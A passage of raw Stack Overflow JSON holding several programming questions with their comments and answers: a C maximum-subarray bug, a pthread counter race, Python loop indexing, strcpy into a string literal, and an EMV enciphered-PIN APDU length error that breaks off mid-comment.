"is_answered": true, "view_count": 1933, "favorite_count": 0, "accepted_answer_id": 33647719, "answer_count": 1, "score": 0, "last_activity_date": 1447234487, "creation_date": 1447233343, "last_edit_date": 1447234054, "question_id": 33647389, "link": "https://stackoverflow.com/questions/33647389/find-out-the-maximum-sub-array-of-non-negative-numbers-from-an-array", "title": "Find out the maximum sub-array of non negative numbers from an array", "body": "<p><code>A : [1, 2, 5, -7, 2, 3]</code> The two sub-arrays are <code>[1, 2, 5]</code> <code>[2, 3]</code>. \nThe answer is <code>[1, 2, 5]</code>as its sum is larger than <code>[2, 3]</code></p>\n\n<p>NOTE: If there is a tie, then compare with segment's length and return segment which has maximum length.<br>\nNOTE 2: If there is still a tie, then return the segment with minimum starting index.</p>\n\n<p>I have written the code and its working for some cases but not for this one :</p>\n\n<pre><code>A : [ 1967513926, 1540383426, -1303455736, -521595368 ]\nYour function returned the following :\n1967513926 \nThe expected returned value :\n1967513926 1540383426 \n</code></pre>\n\n<p>Here is my code</p>\n\n<pre><code>int* maxset(int* A, int n1, int *length_of_array) {\n\n     int greatin=0,greatout=0,greatin1=0,number1=0,number=0;\n     int n3,i,count=0,k,sum=0,max=0,ini=0,end=0;\n\n     for(i=0;i&lt;n1;i++)\n     {\n         ini=end;\n         if(A[i]&gt;=0)\n         {\n             count=1;\n             number++;\n             sum=sum+A[i];\n             if (sum&gt;max )\n             {\n\n                 max=sum;\n                 greatout=i;\n                 greatin=ini;\n\n             }\n             else if (sum==max &amp;&amp; number&gt;number1)\n             {\n                  max=sum;\n                 greatout=i;\n                 greatin=ini;\n             }\n         }\n        else\n        {\n            sum=0;\n            end=i+1;\n            number1=number;\n            number=0;\n\n        }\n     }\n    if(count&gt;0)\n    {\n          count=0;\n          n3=greatout-greatin+1;\n          *length_of_array=n3;\n          int * ret = (int *) malloc(sizeof(int) * *length_of_array);\n\n          for(i=greatin;count&lt;n3;i++)\n          {\n               ret[count]=A[i];\n               count++;\n\n          } \n     return ret;\n\n    }\n    else\n     {\n\n      *length_of_array=0;\n      int * ret = (int *) malloc(sizeof(int) * *length_of_array);\n      return ret;\n     }\n}\n</code></pre>\n"}, {"tags": ["c", "multithreading", "locking", "pthreads", "counter"], "comments": [{"owner": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447233735, "post_id": 33647258, "comment_id": 55068378, "body": "Do you ever initialise &amp; declare  <code>counter1</code>? If so, where?"}, {"owner": {"reputation": 27, "user_id": 5454694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66c2afd979173415eec3c761f0f71388?s=128&d=identicon&r=PG&f=1", "display_name": "Tarun", "link": "https://stackoverflow.com/users/5454694/tarun"}, "reply_to_user": {"reputation": 7061, "user_id": 5389107, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/769c1f4253eca239d400ce3226d801b4?s=128&d=identicon&r=PG&f=1", "display_name": "user308386", "link": "https://stackoverflow.com/users/5389107/user308386"}, "edited": false, "score": 0, "creation_date": 1447234050, "post_id": 33647258, "comment_id": 55068522, "body": "@Magisch By mistake I didn&#39;t copy the upper part of file. Added"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1447237159, "post_id": 33647258, "comment_id": 55070272, "body": "<code>pthread_mutex_destroy(&amp;lock);</code> Take a guess at what that does? Clue: once you destroy something you generally can&#39;t use it anymore. And you certainly are using the lock after that."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1447238633, "post_id": 33647258, "comment_id": 55071113, "body": "Add to that, any particular  reason you&#39;re using <code>sem_init</code> for initializing a pthread <i>mutex</i> ? Whatever text you&#39;re using for your pthread tutorial, burn it and get another. <a href=\"http://pubs.opengroup.org/onlinepubs/007908799/xsh/pthread_mutex_init.html\" rel=\"nofollow noreferrer\"><code>pthread_mutex_init</code></a> and/or <code>PTHREAD_MUTEX_INITIALIZER</code> should be used instead."}, {"owner": {"reputation": 27, "user_id": 5454694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66c2afd979173415eec3c761f0f71388?s=128&d=identicon&r=PG&f=1", "display_name": "Tarun", "link": "https://stackoverflow.com/users/5454694/tarun"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1447238751, "post_id": 33647258, "comment_id": 55071183, "body": "@kaylum I got it . I corrected that . But still I am getting same answer"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1447239131, "post_id": 33647258, "comment_id": 55071381, "body": "What is the variable <code>mutex</code> declared to be? It&#39;s not shown. Are you making this up as you go or is this your real code?"}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1447239156, "post_id": 33647258, "comment_id": 55071400, "body": "that is not the good way to do multi-threadings. it doesn&#39;t make sense what you are doing. also pthread_mutex_destroy(&amp;lock); should be at the end of all operations."}, {"owner": {"reputation": 27, "user_id": 5454694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66c2afd979173415eec3c761f0f71388?s=128&d=identicon&r=PG&f=1", "display_name": "Tarun", "link": "https://stackoverflow.com/users/5454694/tarun"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1447239280, "post_id": 33647258, "comment_id": 55071471, "body": "@WhozCraig sorry for the typos in the code, I am not using sem_init for initializing pthread mutex;   edited the code"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1447239428, "post_id": 33647258, "comment_id": 55071545, "body": "@Tarun Please, you need to show the real code that you have compiled and run. Otherwise you will cause a lot of churn and wasted comments."}, {"owner": {"reputation": 27, "user_id": 5454694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66c2afd979173415eec3c761f0f71388?s=128&d=identicon&r=PG&f=1", "display_name": "Tarun", "link": "https://stackoverflow.com/users/5454694/tarun"}, "edited": false, "score": 0, "creation_date": 1447239679, "post_id": 33647258, "comment_id": 55071672, "body": "Sorry guys,  I will be more careful from next time."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1447241144, "post_id": 33647258, "comment_id": 55072486, "body": "Another nice example why one should <b>always</b> check the outcome of <b>all</b> relevant function calls. <i>All</i> those <code>pthread_*()</code> functions return an error code. The code you show mostly ignores it. Why? Those are debugging helpers for <i>free</i>."}], "answers": [{"tags": [], "owner": {"reputation": 215710, "user_id": 134633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc6be45ddcfd038ba5e1e5fca319c7fa?s=128&d=identicon&r=PG", "display_name": "caf", "link": "https://stackoverflow.com/users/134633/caf"}, "is_accepted": true, "score": 2, "last_activity_date": 1447239169, "creation_date": 1447239169, "answer_id": 33649028, "question_id": 33647258, "link": "https://stackoverflow.com/questions/33647258/getting-wrong-answer-using-thread-safe-counter/33649028#33649028", "title": "Getting wrong answer Using Thread safe counter", "body": "<p>You have three problems.  Firstly, you aren't initialising your mutex.  You have a static mutex so you can use the static initialiser:</p>\n\n<pre><code>pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;\n</code></pre>\n\n<p>Secondly, you shouldn't be calling <code>pthread_mutex_destroy()</code> in the loop - that's only supposed to be called when you will never use the mutex again.  In this case, with a static mutex, you don't need to call <code>pthread_mutex_destroy()</code> at all - it will be cleaned up at program exit.</p>\n\n<p>The third problem is that you read <code>counter1</code> without holding the lock.  One example of how this can go wrong is that both threads can read <code>counter1</code> at the same time and see the value 999999 - they will both decide to increment it, so it will end up at 1000001.  You need to hold the lock continuously between deciding to increment the counter and actually incrementing it.  Something like:</p>\n\n<pre><code>void* myOperation()\n{\n    int finished = 0;\n\n    while (!finished) {\n        pthread_mutex_lock(&amp;lock);\n        if (counter1 &lt; 1000000)\n            ++counter1;\n        else\n            finished = 1;\n        pthread_mutex_unlock(&amp;lock);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 5454694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/66c2afd979173415eec3c761f0f71388?s=128&d=identicon&r=PG&f=1", "display_name": "Tarun", "link": "https://stackoverflow.com/users/5454694/tarun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 33649028, "answer_count": 1, "score": 0, "last_activity_date": 1447239355, "creation_date": 1447232829, "last_edit_date": 1447239355, "question_id": 33647258, "link": "https://stackoverflow.com/questions/33647258/getting-wrong-answer-using-thread-safe-counter", "title": "Getting wrong answer Using Thread safe counter", "body": "<p>I am counting a counter till 1000000 , 50 times Using 2 threads. I am using lock , but I am getting different answer every time. Why it is happening so.\nI thought I will get the counter value exactly 1000000 , but it is not behaving that way. What may be the reason?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#include&lt;pthread.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;semaphore.h&gt;\n#define OPERATIONS 50\nlong unsigned int counter1=0;\npthread_mutex_t lock;\n\npthread_t tid[2];\n\n\nvoid* myOperation()\n{   \n    while(counter1&lt;1000000) {\n        int pi=pthread_self();\n        pthread_mutex_lock(&amp;lock);  \n        ++counter1;\n        //printf(\"\\n counter: %lu thread %d\\n\", counter1,pi);\n        pthread_mutex_unlock(&amp;lock);\n\n    }\n    return NULL;  \n}\n\nint main()\n{\n    int k = 0,p=0;;\n    int err;\n\n    int t=0;\n    int i, j;\n    i=0;\n\n\n    for(j = 0; j &lt; OPERATIONS; j++) {       \n        counter1=0;\n        k=0;\n\n        while(k &lt; 2) {\n            err = pthread_create(&amp;(tid[k]), NULL, &amp;myOperation, NULL);\n            if (err != 0)\n                printf(\"\\ncan't create thread :[%s]\", strerror(err));\n            k++;\n        }\n        pthread_join(tid[0], NULL);\n        pthread_join(tid[1], NULL);\n\n        printf(\"iiiiiiiiiiiii ----- %lu\\n\",counter1);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>iiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000001\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000001\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000001\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000001\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000001\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\niiiiiiiiiiiii ----- 1000000\n</code></pre>\n"}, {"tags": ["python", "c"], "comments": [{"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1447233396, "post_id": 33647248, "comment_id": 55068204, "body": "Side-note: Don&#39;t name your variable <code>list</code> (or any other built-in name). That&#39;s just asking for trouble. My answer used <code>mylist</code> as a safe placeholder."}, {"owner": {"reputation": 22991, "user_id": 1169096, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b4d93e08b2830786a7992e8af35514c6?s=128&d=identicon&r=PG", "display_name": "uml&#228;ute", "link": "https://stackoverflow.com/users/1169096/uml%c3%a4ute"}, "edited": false, "score": 0, "creation_date": 1447233644, "post_id": 33647248, "comment_id": 55068329, "body": "another side-note: rather than stating that &quot;there is an error&quot; it can often be quite helpful to <i>post</i> that error."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1447237736, "post_id": 33647248, "comment_id": 55070595, "body": "Overwriting the name of a standard-type makes it unreachable for other calls. <b>Do not!</b>"}], "answers": [{"tags": [], "owner": {"reputation": 538888, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "is_accepted": false, "score": 3, "last_activity_date": 1447233073, "last_edit_date": 1447233073, "creation_date": 1447232940, "answer_id": 33647282, "question_id": 33647248, "link": "https://stackoverflow.com/questions/33647248/python-c-program-for-loop-equivalent/33647282#33647282", "title": "Python - C program for loop equivalent", "body": "<p>If you're really just interested in the indexes, you can use <code>range</code> rather than <code>enumerate</code>.</p>\n\n<pre><code>for i in range(5):\n    for j in range(i+1, 5):\n        print i, j\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1447233932, "post_id": 33647310, "comment_id": 55068462, "body": "FYI, I followed the convention of <code>i</code> and <code>j</code> referring to indices, while <code>x</code> and <code>y</code> refer to values. Your original question uses <code>i</code> and <code>j</code> for the values, which will trip up maintainers. Obviously, meaningful names are best (and <code>i</code> and <code>j</code> might be better made <code>ix</code> and <code>iy</code> to indicate the index relationship with <code>x</code> and <code>y</code>), but for example code, I&#39;ll stick with conventional one-letter names."}], "tags": [], "owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "is_accepted": true, "score": 6, "last_activity_date": 1447233675, "last_edit_date": 1447233675, "creation_date": 1447233058, "answer_id": 33647310, "question_id": 33647248, "link": "https://stackoverflow.com/questions/33647248/python-c-program-for-loop-equivalent/33647310#33647310", "title": "Python - C program for loop equivalent", "body": "<p>If you're trying to get the actual index values for some reason (and/or need to control the inner loop separate from the outer), you'd do:</p>\n\n<pre><code>for i in range(len(mylist)):\n    for j in range(i+1, len(mylist)):\n\n# Or for indices and elements:\nfor i, x in enumerate(mylist):\n    for j, y in enumerate(mylist[i+1:], start=i+1):\n</code></pre>\n\n<p>But if what you really want is unique non-repeating pairings of the elements, there is a better way, <a href=\"https://docs.python.org/3/library/itertools.html#itertools.combinations\" rel=\"nofollow\"><code>itertools.combinations</code></a>:</p>\n\n<pre><code>import itertools\n\nfor x, y in itertools.combinations(mylist, 2):\n</code></pre>\n\n<p>That gets the values, not the indices, but usually, that what you really wanted. If you really need indices too, you can mix with <code>enumerate</code>:</p>\n\n<pre><code>for (i, x), (j, y) in itertools.combinations(enumerate(mylist), 2):\n</code></pre>\n\n<p>Which gets the exact index pattern you're looking for, as well as the values. You can also use it to efficiently produce the indices alone as a single loop with:</p>\n\n<pre><code>for i, j in itertools.combinations(range(len(mylist)), 2):\n</code></pre>\n\n<p>Short answer: <code>itertools</code> is magical for stuff like this.</p>\n"}], "owner": {"reputation": 5621, "user_id": 2825570, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/kAKzL.png?s=128&g=1", "display_name": "Jeril", "link": "https://stackoverflow.com/users/2825570/jeril"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125, "favorite_count": 0, "accepted_answer_id": 33647310, "answer_count": 2, "score": 0, "last_activity_date": 1618316033, "creation_date": 1447232792, "last_edit_date": 1447233710, "question_id": 33647248, "link": "https://stackoverflow.com/questions/33647248/python-c-program-for-loop-equivalent", "title": "Python - C program for loop equivalent", "body": "<p>I was using the following <code>for</code> loop in my C program:</p>\n\n<pre><code>for (i = 0; i &lt; 5; i++) {\n  for (j = i + 1; j &lt; 5; j++) {\n    //some operation using the index values\n  }\n}\n</code></pre>\n\n<p>What would be the python equivalent for the second <code>for</code> loop, (<code>j = i + 1</code>)? I tried the following but there is an error:</p>\n\n<pre><code>for indexi, i in enumerate(list):\n    for indexj = indexi + 1, j in enumerate(list):\n</code></pre>\n\n<p>How to do it?</p>\n"}, {"tags": ["c", "arrays", "string", "pointers"], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 5134291, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ed859594a9bb1cc11bf5db203865f339?s=128&d=identicon&r=PG&f=1", "display_name": "naiveBayes", "link": "https://stackoverflow.com/users/5134291/naivebayes"}, "edited": false, "score": 0, "creation_date": 1447232713, "post_id": 33647128, "comment_id": 55067860, "body": "i just removed the malloc to avoid unnecessary confusion. I&#39;ve tried using memcopy but ended with the same error."}, {"owner": {"reputation": 25, "user_id": 5134291, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ed859594a9bb1cc11bf5db203865f339?s=128&d=identicon&r=PG&f=1", "display_name": "naiveBayes", "link": "https://stackoverflow.com/users/5134291/naivebayes"}, "edited": false, "score": 0, "creation_date": 1447232796, "post_id": 33647128, "comment_id": 55067900, "body": "Ah yes!  *s[] is a read only literal. I&#39;ve overlooked it. Thanks"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 2, "last_activity_date": 1447232609, "last_edit_date": 1495542614, "creation_date": 1447232307, "answer_id": 33647128, "question_id": 33647089, "link": "https://stackoverflow.com/questions/33647089/issue-with-char-pointer-being-assigned-to-another-location-and-using-strcpy/33647128#33647128", "title": "Issue with char pointer being assigned to another location and using strcpy()?", "body": "<p>You have multiple problems in your code.  Lets start with one of the more obvious: Remember that <code>strcpy</code> adds the string terminator. You might want to use <a href=\"http://en.cppreference.com/w/c/string/byte/memcpy\" rel=\"nofollow noreferrer\"><code>memcpy</code></a> instead:</p>\n\n<pre><code>memcpy(j, str2, strlen(str2));\n</code></pre>\n\n<p>To continue, you allocate memory and assign it to <code>j</code>, then in the loop you <em>reassign</em> to <code>j</code> making <code>j</code> point somewhere else, and you loose the original memory you have allocated leading to a memory leak. Also, <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">in C you should not cast the result of <code>malloc</code></a>.</p>\n\n<p>Lastly, and the probable cause of your crash: You try to modify a string literal, and all string literals are <em>read only</em>.</p>\n"}], "owner": {"reputation": 25, "user_id": 5134291, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ed859594a9bb1cc11bf5db203865f339?s=128&d=identicon&r=PG&f=1", "display_name": "naiveBayes", "link": "https://stackoverflow.com/users/5134291/naivebayes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1447232638, "creation_date": 1447232169, "last_edit_date": 1447232638, "question_id": 33647089, "link": "https://stackoverflow.com/questions/33647089/issue-with-char-pointer-being-assigned-to-another-location-and-using-strcpy", "title": "Issue with char pointer being assigned to another location and using strcpy()?", "body": "<p>Here i'm trying to replace the word \"how are you\" in string array 's' by \"woo\". But it is exiting abruptly during the runtime . please help      </p>\n\n<pre><code>char *s[] = {\"hi there\",\"how are you\",\"Fine Ok!\"};\nchar str1[4] = \"how\" ;char str2[4] = \"woo\";\nchar *j = NULL; //(char *)malloc(100*sizeof(char));\nint i,k; char n[100] = \"hi\";\n//printf(\"%d\",strlen(s));\nfor(i = 0;i&lt;3;i++ )\n{\n    j = strstr(s[i],str1);\n    if(j==0)\n    continue;\n    else\n    {\n        printf(\"j is %s\",j);\n        printf(\"j is %s\",j+10);\n        strcpy(j,str2);\n\n        printf(\"j is %s\",j);\n        break;\n    }\n}\nprintf(\"%s\",s[1]);\nreturn 0;\n</code></pre>\n"}, {"tags": ["c", "apdu", "emv"], "comments": [{"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 1, "creation_date": 1447233250, "post_id": 33647086, "comment_id": 55068132, "body": "Maybe you should explain your problem better, including the expected output and more details on the error."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1447237162, "post_id": 33647086, "comment_id": 55070276, "body": "This is what am doing, capture PIN entered in plaintext format i.e (1234), construct a pin block(0412AC89ABCDEF67) using the pin and the pan and iso format 0, concatinating (7F, pinblock, unpredictable number, random padding), applying rsa algorithm to obtain the Enciphered PIN Data(128 bytes), and then sending the verify command to ICC but when I put apduSend.Lc = 128; command is not sent and when I put apduSend.Lc = 0; I get wrong length 6700"}, {"owner": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 1, "creation_date": 1447238785, "post_id": 33647086, "comment_id": 55071203, "body": "@Meg, did you sent <i>GET CHALLENGE</i> command before sending <i>Verify</i> command? And what is the key size of ICC Private Key? Are you sure it is 128 byte? Moreover EMV verify command use ISO 9564 Format 2."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "edited": false, "score": 0, "creation_date": 1447240262, "post_id": 33647086, "comment_id": 55071992, "body": "I sent GET CHALLENGE command and got a 8byte unpredictable number. The ICC public key modulus is 128 bytes."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "edited": false, "score": 0, "creation_date": 1447243202, "post_id": 33647086, "comment_id": 55073611, "body": "I am sending a VERIFY command including the Enciphered PIN Data which is this(82DC1467927A62EED292420528ADC07328D37D280930A0A7BA2C007&zwnj;&#8203;254752837AB1D2EC3A2F&zwnj;&#8203;828878ED37DABC3CBB61&zwnj;&#8203;9182FFD845DE6463FA9D&zwnj;&#8203;EB9ADAD3F37BE072A5A3&zwnj;&#8203;D737CC197B8CB7287853&zwnj;&#8203;869D32C5288CD8B4B6C7&zwnj;&#8203;2C56A3D7CDC893660895&zwnj;&#8203;ED72850CBD223B91E8DD&zwnj;&#8203;FC8DA8DA9262DA51DA97&zwnj;&#8203;28721C5437D0D8269013&zwnj;&#8203;C) and setting apduSend.Command[0] = 0x00; \tapduSend.Command[1] = 0x20; \tapduSend.Command[2] = 0x00; \tapduSend.Command[3] = 0x88; \tapduSend.Lc = 256;"}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447244066, "post_id": 33647086, "comment_id": 55074038, "body": "@rakeb,mazharul, I have used ISO 9564 to format the pin but am still getting 6700. The ICC public key modulus is 256 characters and the enciphered pin data is 256 characters so I put 128 in apduSend.Lc = 128."}, {"owner": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447244193, "post_id": 33647086, "comment_id": 55074092, "body": "@Meg, You sure the ICC supports Enciphered PIN verification? Maybe it only supports <i>plaintext</i> PIN. Send this APDU Command and see what&#39;s the status word: <code>00 20 0080 08 241234FFFFFFFFFF</code>."}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "edited": false, "score": 0, "creation_date": 1447244827, "post_id": 33647086, "comment_id": 55074446, "body": "I have read this from the card(8E 14 00 00 00 00 00 00 00 00 42 01 44 03 41 03 42 03 1E 03 1F 03 )           Cardholder Verification Rule             Rule: Enciphered PIN verification performed by ICC             Condition Code: If terminal supports the CVM             Apply succeeding CV Rule if this CVM is unsuccessful           Cardholder Verification Rule             Rule: Plaintext PIN verification performed by ICC             Condition Code: If terminal supports the CVM             Apply succeeding CV Rule if this CVM is unsuccessful"}, {"owner": {"reputation": 198, "user_id": 5549834, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3b3f19963f184d0239c3a3337490d9e?s=128&d=identicon&r=PG&f=1", "display_name": "Meg", "link": "https://stackoverflow.com/users/5549834/meg"}, "reply_to_user": {"reputation": 5413, "user_id": 1743849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5cwvZ.jpg?s=128&g=1", "display_name": "rakeb.mazharul", "link": "https://stackoverflow.com/users/1743849/rakeb-mazharul"}, "edited": false, "score": 0, "creation_date": 1447244994, "post_id": 33647086, "comment_id": 55074525, "body": "@rakeb, \t I have read this from the card(8E 14 00 00 00 00 00 00 00 00 42 01 44 03 41 03 42 03 1E 03 1F 03 ) Cardholder Verification Rule 1: Enciphered PIN verification performed by ICC. Condition Code: If terminal supports the CVM Apply succeeding CV Rule if this CVM is unsuccessful Cardholder Verification Rule 2: Plaintext PIN verification performed by ICC. Condition Code: If terminal supports the CVM Apply succeeding CV Rule if this CVM is unsuccessful"}, {"owner": {"reputation": 198, 